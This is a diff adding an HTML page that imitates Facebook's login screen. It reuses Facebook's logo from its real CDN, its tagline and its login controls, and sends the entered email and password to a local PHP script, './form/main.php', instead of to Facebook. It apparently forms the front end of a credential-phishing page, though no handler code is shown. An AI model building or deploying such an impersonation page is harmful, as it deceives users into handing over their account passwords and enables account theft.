@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FORMULARIO FACEBOOK</title>
+    <link rel="stylesheet" href="./css/styles.css">
+</head>
+<body>
+    <!-- HOME FACEBOOK -->
+    <main class="flex">
+        <section class="flex">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="logo de FB">
+            <h2>Facebook helps you connect and share with the people in your life.</h2>
+        </section>
+        <section class="flex">
+            <div class="flex form-container">
+                <form action="./form/main.php" method="POST">
+                    <!-- INPUT EMAIL -->
+                    <label for="email">Ingresa tu email para continuar</label>
+                    <input type="email" name="email" id="email" placeholder="Email address">
+                    <!-- INPUT PASS -->
+                    <label for="pass"></label>
+                    <input type="password" name="pass" id="pass">
+
+                    <button type="submit" id="button-submit">
+                        Log in
+                    </button>
+
+                    <a href="#">Forgotten password?</a>
+
+                </form>
+
+                <button>
+                    Create New Account
+                </button>
+
+            </div>
+            <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+        </section>
+
+
+    </main>
+</body>
+</html>
